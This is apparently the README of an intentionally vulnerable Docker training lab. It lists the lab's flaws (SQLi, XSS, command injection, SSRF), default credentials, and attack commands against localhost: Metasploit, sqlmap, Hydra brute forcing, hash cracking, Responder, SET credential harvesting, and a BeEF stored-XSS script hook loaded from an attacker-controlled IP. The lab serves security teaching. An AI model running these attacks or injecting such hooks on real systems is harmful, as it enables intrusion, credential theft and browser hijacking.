# Vulnerable Web Application Lab

A comprehensive, intentionally vulnerable web application for demonstrating security tools.

## ⚠️ WARNING

This application contains DELIBERATE security vulnerabilities.
- NEVER deploy on public networks
- ONLY use in isolated environments
- FOR EDUCATIONAL PURPOSES ONLY

## Quick Start

```bash
cd /home/demonwarrior/Demonstration
chmod +x setup.sh
./setup.sh
```

Or manually:

```bash
cd /home/demonwarrior/Demonstration/vulnerable-webapp
docker compose up -d
```

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Vulnerable Lab Network                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  Flask App   │  │   MySQL      │  │   WordPress  │      │
│  │  Port 5000   │  │  Port 3306   │  │  Port 8080   │      │
│  │              │  │              │  │              │      │
│  │ - SQLi       │  │ - Weak Auth  │  │ - WPScan     │      │
│  │ - XSS        │  │ - Weak Pass  │  │ - XSS        │      │
│  │ - CMDi       │  │              │  │ - Plugins    │      │
│  │ - IDOR       │  │              │  │              │      │
│  │ - SSRF       │  │              │  │              │      │
│  │ - File Upload│  │              │  │              │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                              │
│  ┌──────────────┐  ┌──────────────┐                         │
│  │   FTP        │  │    SSH       │                         │
│  │  Port 21     │  │  Port 2222   │                         │
│  │              │  │              │                         │
│  │ - Anonymous  │  │ - Weak Pass  │                         │
│  │ - Weak Pass  │  │              │                         │
│  └──────────────┘  └──────────────┘                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## Tool Demonstrations

### 1. Nmap
```bash
nmap -sV -sC localhost
nmap -A -T4 localhost
nmap --script=vuln localhost
```

### 2. Metasploit Framework
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS localhost
run
```

### 3. Burp Suite
- Configure proxy: `127.0.0.1:8080`
- Intercept requests to `http://localhost:5000`
- Test for SQLi, XSS, IDOR

### 4. Wireshark
- Capture on Docker interface
- Filter: `http`
- Observe plaintext credentials

### 5. Nikto
```bash
nikto -h http://localhost:5000
```

### 6. Gobuster
```bash
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt
```

### 7. SQLmap
```bash
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --dbs
```

### 8. John the Ripper
```bash
# Get hashes
mysql -h localhost -u vulnuser -pvulnpass vulnapp -e "SELECT username, password FROM user;" > hashes.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### 9. Hashcat
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 10. Aircrack-ng (Requires WiFi Adapter)
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

### 11. Hydra
```bash
hydra -l sshuser -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost
```

### 12. Netcat
```bash
nc localhost 21
nc localhost 2222
nc -v localhost 5000
```

### 13. Responder
```bash
sudo responder -I eth0 -wrf
```

### 14. BeEF
```bash
# Start BeEF
./beef

# Hook browser via stored XSS on /posts
<script src="http://YOUR_IP:3000/hook.js"></script>
```

### 15. SET (Social-Engineer Toolkit)
```bash
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack
# 2) Site Cloner
```

## Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| Flask App | admin | admin |
| Flask App | user | password |
| Flask App | test | test123 |
| MySQL | vulnuser | vulnpass |
| FTP | ftpuser | ftppass123 |
| SSH | sshuser | sshpass123 |

## Vulnerability Types

| Vulnerability | Location | Tool |
|---------------|----------|------|
| SQL Injection | /login, /messages | SQLmap |
| Reflected XSS | /search | Burp Suite |
| Stored XSS | /posts | BeEF |
| Command Injection | /ping, /dns | Netcat |
| IDOR | /profile?id= | Burp Suite |
| File Upload | /upload | Nikto |
| SSRF | /fetch | Burp Suite |
| Open Redirect | /redirect | Burp Suite |
| Weak Passwords | /login | Hydra, John |
| Debug Endpoint | /debug | Nmap |

## Services

| Service | Port | Purpose |
|---------|------|---------|
| Flask App | 5000 | Main vulnerable app |
| MySQL | 3306 | Database for SQLmap |
| FTP | 21 | FTP brute force testing |
| SSH | 2222 | SSH brute force testing |
| WordPress | 8080 | WPScan testing |

## Cleanup

```bash
docker compose down -v
```

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA Documentation](https://github.com/digininja/DVWA)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

## Disclaimer

This project is for educational purposes only. The authors are not responsible for any misuse of this software. Only use in authorized testing environments.
